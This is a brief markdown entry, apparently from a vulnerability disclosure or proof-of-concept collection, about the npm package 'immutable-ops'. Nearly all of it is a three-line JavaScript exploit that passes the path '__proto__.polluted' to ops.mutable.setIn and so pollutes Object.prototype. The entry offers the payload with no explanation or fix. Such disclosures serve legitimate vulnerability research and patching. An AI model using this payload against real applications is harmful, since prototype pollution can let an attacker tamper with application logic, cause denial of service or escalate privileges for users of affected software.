# immutable-ops

- package name: `immutable-ops`

- PoC exploit:

```javascript
var immutable = require('immutable-ops');
immutable.ops.mutable.setIn('__proto__.polluted', 'yes', {});
// Object.prototype.polluted === 'yes'
```